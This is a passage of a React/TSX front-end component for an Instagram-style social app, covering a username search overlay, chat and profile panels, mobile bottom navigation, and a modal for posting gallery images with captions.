                  background: isDark ? '#0a0a0c' : '#ffffff'
                }}
              >
                {/* Search Overlay Header */}
                <div className="flex items-center gap-3 px-4 pt-[calc(1rem+env(safe-area-inset-top,0px))] pb-3 border-b" style={{ borderColor: isDark ? 'rgba(255,255,255,0.08)' : 'rgba(0,0,0,0.08)' }}>
                  <button 
                    onClick={() => {
                      setSearchQuery('');
                      setIsSearchOverlayOpen(false);
                    }}
                    className="w-9 h-9 rounded-full flex items-center justify-center transition-all active:scale-90"
                    style={{ background: isDark ? 'rgba(255,255,255,0.05)' : 'rgba(0,0,0,0.04)', color: 'var(--dm-text-primary)' }}
                  >
                    <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M10 19l-7-7m0 0l7-7m-7 7h18" />
                    </svg>
                  </button>
                  <input
                    type="text"
                    autoFocus
                    placeholder="Search @username..."
                    value={searchQuery}
                    onChange={(e) => setSearchQuery(e.target.value)}
                    className="flex-1 h-10 px-4 rounded-full text-sm font-light border focus:outline-none"
                    style={{
                      background: isDark ? 'rgba(255,255,255,0.03)' : 'rgba(0,0,0,0.02)',
                      borderColor: isDark ? 'rgba(255,255,255,0.08)' : 'rgba(0,0,0,0.08)',
                      color: 'var(--dm-text-primary)'
                    }}
                  />
                </div>

                {/* Search Content */}
                <div className="flex-1 overflow-y-auto px-4 py-4">
                  {searchQuery.trim().length === 0 ? (
                    <div>
                      <p className="text-xs font-semibold uppercase tracking-wider mb-3 text-zinc-500">Recent Searches</p>
                      {searchHistory.length === 0 ? (
                        <p className="text-sm font-light text-zinc-500 py-4 text-center">No search history</p>
                      ) : (
                        <div className="space-y-2">
                          {searchHistory.map((item: any) => (
                            <div
                              key={item.id}
                              onClick={(e) => {
                                handleAddToHistory(item);
                                handleOpenOtherProfile(item.id, item, e);
                                setIsSearchOverlayOpen(false);
                              }}
                              className="flex items-center justify-between p-3.5 rounded-xl cursor-pointer hover:bg-zinc-100 dark:hover:bg-zinc-900 transition-colors"
                            >
                              <div className="flex items-center gap-3">
                                <div className="w-9 h-9 rounded-full overflow-hidden flex-shrink-0" style={{ background: 'var(--dm-bg-active)' }}>
                                  {item.image ? (
                                    <img src={item.image} alt="user" className="w-full h-full object-cover" />
                                  ) : (
                                    <img src="/Avatar.avif" alt="user" className="w-full h-full object-cover" />
                                  )}
                                </div>
                                <div>
                                  <p className="text-sm font-semibold" style={{ color: 'var(--dm-text-primary)' }}>@{item.username || 'username'}</p>
                                  {item.name && <p className="text-xs text-zinc-500">{item.name}</p>}
                                </div>
                              </div>
                              <button
                                onClick={(e) => handleRemoveFromHistory(item.id, e)}
                                className="w-7 h-7 rounded-full flex items-center justify-center hover:bg-zinc-200 dark:hover:bg-zinc-800 text-zinc-400 hover:text-zinc-600 transition-colors"
                              >
                                <svg width="14" height="14" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2.5} d="M6 18L18 6M6 6l12 12" />
                                </svg>
                              </button>
                            </div>
                          ))}
                        </div>
                      )}
                    </div>
                  ) : (
                    <div>
                      <p className="text-xs font-semibold uppercase tracking-wider mb-3 text-zinc-500">Users</p>
                      {isSearching ? (
                        <div className="flex items-center justify-center py-8 gap-3">
                          <div className="w-5 h-5 rounded-full border-2 border-t-transparent border-orange-500 animate-spin" />
                          <span className="text-sm text-zinc-500">Searching usernames...</span>
                        </div>
                      ) : searchResults.length === 0 ? (
                        <div className="flex flex-col items-center py-10 gap-3">
                          <svg className="w-10 h-10 text-zinc-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.5} d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" />
                          </svg>
                          <p className="text-sm font-medium text-zinc-500">No user found matching "@{searchQuery.replace(/^@/, '')}"</p>
                          <p className="text-xs text-zinc-400">Search strictly by exact or partial @username</p>
                        </div>
                      ) : (
                        <div className="space-y-1">
                          {searchResults.map((item: any) => (
                            <div
                              key={item.id}
                              onClick={(e) => {
                                handleAddToHistory(item);
                                handleOpenOtherProfile(item.id, item, e);
                                setIsSearchOverlayOpen(false);
                              }}
                              className="flex items-center gap-3 p-3 rounded-xl cursor-pointer transition-colors active:scale-[0.99]"
                              style={{ background: 'transparent' }}
                              onMouseEnter={e => (e.currentTarget as HTMLElement).style.background = isDark ? 'rgba(255,255,255,0.05)' : 'rgba(0,0,0,0.04)'}
                              onMouseLeave={e => (e.currentTarget as HTMLElement).style.background = 'transparent'}
                            >
                              <div className="w-11 h-11 rounded-full overflow-hidden flex-shrink-0 border" style={{ borderColor: isDark ? 'rgba(255,255,255,0.1)' : 'rgba(0,0,0,0.1)' }}>
                                {item.image ? (
                                  <img src={item.image} alt="user" className="w-full h-full object-cover" referrerPolicy="no-referrer" />
                                ) : (
                                  <img src="/Avatar.avif" alt="user" className="w-full h-full object-cover" />
                                )}
                              </div>
                              <div className="flex-1 min-w-0">
                                <p className="text-sm font-bold truncate" style={{ color: 'var(--dm-text-primary)' }}>@{item.username || 'username'}</p>
                                <p className="text-xs truncate" style={{ color: 'var(--dm-text-muted)' }}>{item.name || 'User'}{item._count?.followers ? ` · ${item._count.followers} followers` : ''}</p>
                              </div>
                              <svg className="w-4 h-4 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24" style={{ color: 'var(--dm-text-muted)' }}>
                                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 5l7 7-7 7" />
                              </svg>
                            </div>
                          ))}
                        </div>
                      )}
                    </div>
                  )}
                </div>
              </div>
            )}
          </div>
        </div>

        <div className={`ig-tab-panel ${activeView === 'chat' ? 'ig-tab-enter' : ''}`} data-active={activeView === 'chat'}>
          <SocialChat 
            isActive={activeView === 'chat'} 
            onStatusChange={setIsConnected} 
            onChatChange={setSelectedChatUser}
            onBack={() => setActiveView('home')}
            onCallStateChange={setIsCallActive}
            initialUser={selectedChatUser}
            ref={chatComponentRef as any}
            onOpenProfile={(targetUser) => {
              setSelectedProfileUser(targetUser);
              setIsProfileOpen(true);
            }}
            onLongPressChatChange={setIsChatLongPressActive}
          />
        </div>

        {/* Instagram-style Profile Panel */}
        <ProfilePanel
          isOpen={isProfileOpen}
          isClosing={isClosingProfile}
          onClose={handleCloseProfile}
          session={displaySession}
          fullUser={selectedProfileUser || fullUser}
          targetUser={selectedProfileUser}
          isDark={isDark}
          onEditName={() => {
            setUsernameInput(fullUser?.name || '');
            setEditingUsername(true);
            setUsernameError('');
          }}
          onInstall={handleInstallApp}
          refreshProfile={refreshProfile}
          onToggleFollow={handleToggleFollow}
          onOpenChat={(targetUser) => {
            // Reset nav transition lock so it doesn't block
            navTransitionInProgress.current = false;
            // Origin from bottom-center to match bottom nav bar feel (bottom-to-top ripple)
            const x = window.innerWidth / 2;
            const y = window.innerHeight;
            runProfileTransition(() => {
              setIsProfileOpen(false);
              setIsClosingProfile(false);
              setSelectedProfileUser(null);
              setSelectedChatUser({ ...targetUser, _openTs: Date.now() });
              setActiveView('chat');
            }, x, y, false);
          }}
          onAccountSheetChange={setIsAccountSheetOpen}
          onOpenUpload={(type) => {
            setUploadType(type);
            setUploadUrl('');
            setUploadCaption('');
            setShowUploadModal(true);
          }}
        />
      </div>

      {/* Mobile Bottom Navigation — round glass pill bar floats nicely near the bottom */}
      {((activeView === 'home' || activeView === 'search' || (activeView === 'chat' && !selectedChatUser)) && !isCallActive) && (
        <nav className={`mobile-nav ${(isAccountSheetOpen || isSearchOverlayOpen || isChatLongPressActive) ? 'mobile-nav-hidden' : ''}`}>
          {[
            { 
              id: 'home', 
              element: (
                <svg className="w-6 h-6" fill="none" stroke="currentColor" strokeWidth={2} viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" d="M3 12l2-2m0 0l7-7 7 7M5 10v10a1 1 0 001 1h3m10-11l2 2m-2-2v10a1 1 0 01-1 1h-3m-6 0a1 1 0 001-1v-4a1 1 0 011-1h2a1 1 0 011 1v4a1 1 0 001 1m-6 0h6" />
                </svg>
              )
            },
            { 
              id: 'search', 
              element: (
                <svg className="w-6 h-6" fill="none" stroke="currentColor" strokeWidth={2} viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" />
                </svg>
              )
            },
            { 
              id: 'chat', 
              element: (
                <svg className="w-6 h-6" fill="none" stroke="currentColor" strokeWidth={2} viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" d="M21 11.5a8.38 8.38 0 01-.9 3.8 8.5 8.5 0 01-7.6 4.7 8.38 8.38 0 01-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 01-.9-3.8 8.5 8.5 0 014.7-7.6 8.38 8.38 0 013.8-.9h.5a8.48 8.48 0 018 8v.5z" />
                </svg>
              )
            },
          ].map((item) => {
            const isMobileItemActive = !isProfileOpen && activeView === item.id;
            return (
              <button
                key={item.id}
                onClick={(e) => {
                  handleNavClick(item.id, e);
                }}
                className="flex items-center justify-center w-10 h-10 rounded-full transition-all active:scale-90"
                style={{ 
                  background: isMobileItemActive ? 'var(--dm-bg-active)' : 'transparent',
                  color: isMobileItemActive ? 'var(--dm-text-primary)' : 'var(--dm-text-muted)'
                }}
              >
                {item.element}
              </button>
            );
          })}

          <button
            onClick={(e) => runProfileTransition(() => setIsProfileOpen(true), e.clientX, e.clientY, false)}
            className="flex items-center justify-center w-10 h-10 rounded-full transition-all active:scale-90"
            style={{ 
              background: isProfileOpen ? 'var(--dm-bg-active)' : 'transparent',
              color: isProfileOpen ? 'var(--dm-text-primary)' : 'var(--dm-text-muted)'
            }}
          >
            <div className="w-6 h-6 rounded-full overflow-hidden flex items-center justify-center text-[10px] font-bold" style={{ background: isProfileOpen ? 'var(--dm-text-primary)' : 'var(--dm-bg-active)', color: isProfileOpen ? 'var(--dm-text-primary)' : 'var(--dm-text-primary)', border: '1px solid var(--dm-border)' }}>
              <img src="/Avatar.avif" alt="profile" className="w-full h-full object-cover" referrerPolicy="no-referrer" />
            </div>
          </button>
        </nav>
      )}



      {/* Upload Modal */}
      {showUploadModal && (
        <div style={{
          position: 'fixed', inset: 0, zIndex: 9999,
          background: isDark ? 'rgba(0,0,0,0.8)' : 'rgba(0,0,0,0.5)',
          backdropFilter: 'blur(8px)', display: 'flex', alignItems: 'center', justifyContent: 'center'
        }}>
          <div style={{
            background: isDark ? '#1c1c1e' : '#ffffff', borderRadius: '24px', padding: '24px', width: '90%', maxWidth: '400px',
            border: `1px solid ${isDark ? 'rgba(255,255,255,0.08)' : '#f0f0f0'}`, boxShadow: '0 20px 40px rgba(0,0,0,0.2)'
          }}>
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 16 }}>
              <h3 style={{ fontSize: 18, fontWeight: 800, color: isDark ? '#fff' : '#111' }}>Create {uploadType === 'reel' ? 'Reel' : 'Post'}</h3>
              <button onClick={() => setShowUploadModal(false)} style={{ background: 'none', border: 'none', color: isDark ? '#fff' : '#111', cursor: 'pointer', opacity: 0.7 }}>
                <svg width="24" height="24" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth={2.5}><path strokeLinecap="round" strokeLinejoin="round" d="M6 18L18 6M6 6l12 12" /></svg>
              </button>
            </div>
            
            <div style={{ display: 'flex', flexDirection: 'column', gap: 14 }}>
              <div>
                <div style={{ fontSize: 13, fontWeight: 600, color: isDark ? '#a1a1aa' : '#6b7280', marginBottom: 6 }}>Select from Gallery</div>
                <div style={{ display: 'grid', gridTemplateColumns: 'repeat(3, 1fr)', gap: 8, marginBottom: 16 }}>
                  {[
                    'https://images.unsplash.com/photo-1507525428034-b723cf961d3e?auto=format&fit=crop&w=300&h=450&q=80',
                    'https://images.unsplash.com/photo-1470071459604-3b5ec3a7fe05?auto=format&fit=crop&w=300&h=450&q=80',
                    'https://images.unsplash.com/photo-1502082553048-f009c37129b9?auto=format&fit=crop&w=300&h=450&q=80',
                    'https://images.unsplash.com/photo-1447752875215-b2761acb3c5d?auto=format&fit=crop&w=300&h=450&q=80',
                    'https://images.unsplash.com/photo-1475924156734-496f6cac6ec1?auto=format&fit=crop&w=300&h=450&q=80',
                    'https://images.unsplash.com/photo-1469474968028-56623f02e42e?auto=format&fit=crop&w=300&h=450&q=80'
                  ].map((imgUrl, idx) => (
                    <div 
                      key={idx} 
                      onClick={() => setUploadUrl(imgUrl)}
                      style={{
                        aspectRatio: '1', borderRadius: '8px', overflow: 'hidden', cursor: 'pointer',
                        border: uploadUrl === imgUrl ? '2px solid #0095f6' : '2px solid transparent',
                        transition: 'border 0.2s', padding: '2px'
                      }}
                    >
                      <img src={imgUrl} alt="gallery" style={{ width: '100%', height: '100%', objectFit: 'cover', borderRadius: '6px' }} />
                    </div>
                  ))}
                </div>
              </div>
              <div>
                <div style={{ fontSize: 13, fontWeight: 600, color: isDark ? '#a1a1aa' : '#6b7280', marginBottom: 6 }}>Caption</div>
                <textarea 
                  placeholder="Write a caption..."
                  value={uploadCaption}
                  onChange={e => setUploadCaption(e.target.value)}
                  rows={3}
                  style={{
                    width: '100%', padding: '14px', borderRadius: '14px', border: `1px solid ${isDark ? 'rgba(255,255,255,0.08)' : '#f0f0f0'}`,
                    background: isDark ? '#1a1a1f' : '#f9fafb', color: isDark ? '#fff' : '#111', outline: 'none', fontSize: 14, resize: 'none'
                  }}
                />
              </div>
              
              <button 
                onClick={async () => {
                  if (!uploadUrl) return;
                  setUploadLoading(true);
                  try {
                    await createPostAction({ imageUrl: uploadUrl, caption: uploadCaption, postType: uploadType });
                    refreshProfile();
                    setShowUploadModal(false);
                  } catch (e) {
                    console.error('Upload failed', e);
                  }
                  setUploadLoading(false);
                }}
                disabled={uploadLoading || !uploadUrl}
                style={{
                  width: '100%', padding: '14px', background: isDark ? '#fff' : '#111', color: isDark ? '#111' : '#fff', border: 'none', borderRadius: '14px',
                  fontWeight: 700, fontSize: 15, cursor: uploadUrl && !uploadLoading ? 'pointer' : 'not-allowed',
                  opacity: uploadUrl && !uploadLoading ? 1 : 0.6, marginTop: 4, transition: 'opacity 0.2s'
                }}
              >
                {uploadLoading ? 'Posting...' : 'Post'}
              </button>
            </div>
          </div>
        </div>
      )}

    </div>
  );
}
